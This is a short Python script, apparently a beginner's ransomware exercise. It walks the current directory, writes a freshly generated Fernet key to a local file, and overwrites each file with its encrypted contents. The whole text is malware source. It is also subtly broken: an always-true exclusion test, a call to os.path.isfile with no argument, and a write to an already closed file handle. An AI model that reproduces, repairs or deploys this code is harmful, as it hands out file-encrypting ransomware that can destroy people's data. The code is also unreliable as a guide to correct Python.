#!/usr/bin/env python3
#will have to copy code to a .txt file to run
import os
from cryptography.fernet import Fernet

#start by finding files

files = []

for file in os.listdir():
    if file == 'ransome.py' or 'thekey.py':
        continue
    if os.path.isfile():
        files.append(file)

print(files)

key = Fernet.generate_key()

with open('thekey.key', "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as fiel:
        thefile.write(contents_encrypted)